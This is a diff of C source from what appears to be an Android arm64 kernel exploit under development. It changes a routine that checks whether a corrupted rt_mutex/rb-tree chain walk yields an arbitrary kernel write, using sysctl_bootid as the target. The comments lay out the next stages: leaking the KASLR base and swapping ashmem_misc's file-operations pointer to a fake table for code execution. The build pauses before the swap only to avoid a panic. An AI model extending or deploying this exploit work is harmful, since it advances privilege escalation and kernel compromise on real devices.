@@ -349,12 +349,24 @@ void do_pselect_fake_lock_route(void) {
                route_attempt, ret, saved_errno, atomic_load(&consumer_calls),
                atomic_load(&consumer_success));
 
-    /* BOOTID-WRITE-PROOF (attempt 1): the store was aimed at &sysctl_bootid, so
-     * boot_id changing == the chain-walk rb-erase store provably executes on
-     * this device. walk_wrote=1 => go straight on to the fops route below;
-     * walk_wrote=0 WITH walks>=1 => the walk ran on the overlay and still did
-     * not store, which is a genuine rt_mutex/alias problem (next stop: the
-     * P0_DATA_ALIAS delta). walks=0 => the trigger, not the write, is at fault. */
+    /* BOOTID-WRITE-PROOF: the store was aimed at &sysctl_bootid, so boot_id
+     * changing == the chain-walk rb-erase store provably executes on this
+     * device. Read as:
+     *   walks>=1 walk_wrote=1 => primitive OK; next blocker is the KASLR leak.
+     *   walks>=1 walk_wrote=0 => the walk ran ON the overlay and still did not
+     *                            store (next suspect: the P0_DATA_ALIAS delta,
+     *                            although lk.img+vendor_boot say delta==0).
+     *   walks=0              => the trigger, not the store, is still at fault.
+     * This build deliberately NEVER attempts the &ashmem_misc.fops swap: the
+     * fake fops table is still built from text_addr(), and text_addr() currently
+     * resolves through the kaslr_base PLACEHOLDER (main.c sets
+     * P0_PAGE_OFFSET+P0_KERNEL_PHYS_LOAD). Those are linear-map aliases, which
+     * arm64 maps PXN -- so the moment the swap lands, misc_open()'s
+     * `file->f_op->open()` would fetch instructions from a non-executable alias
+     * and panic. The real KASLR base has to be leaked first (copy-shape overlay:
+     * read *&ashmem_misc.fops, which holds the SLID &ashmem_fops, into
+     * sysctl_bootid and read it out of /proc). So every attempt here stays on the
+     * harmless bootid target. */
     if (bootid_proof_active) {
       char bootid_after[64] = "?";
       read_first_line("/proc/sys/kernel/random/boot_id", bootid_after,
@@ -364,15 +376,22 @@ void do_pselect_fake_lock_route(void) {
                  "after=%s walk_wrote=%d\n",
                  route_attempt, atomic_load(&consumer_success),
                  bootid_proof_before, bootid_after, wrote);
-      /* Hand the remaining attempts back to the real &ashmem_misc.fops target
-       * (the next prepare_good_kernel_page re-grooms the page for it). */
-      bootid_proof_active = 0;
       close(high_read);
       if (block_fd != pipefd[0]) {
         close(block_fd);
       }
       close(pipefd[0]);
       close(pipefd[1]);
+      if (wrote) {
+        pr_success("ckpt: BOOTID-WRITE-PROOF POSITIVE attempt=%d — the chain-walk "
+                   "store WORKS (target=%016llx). Stopping before the fops swap on "
+                   "purpose (unslid fake-fops text ptrs would panic misc_open); "
+                   "next build leaks the real KASLR base.\n",
+                   route_attempt, (unsigned long long)data_addr(SYSCTL_BOOTID));
+        atomic_store(&punch_consume_stop, 1);
+        cfi_last_step = 0;
+        break;
+      }
       continue;
     }
 
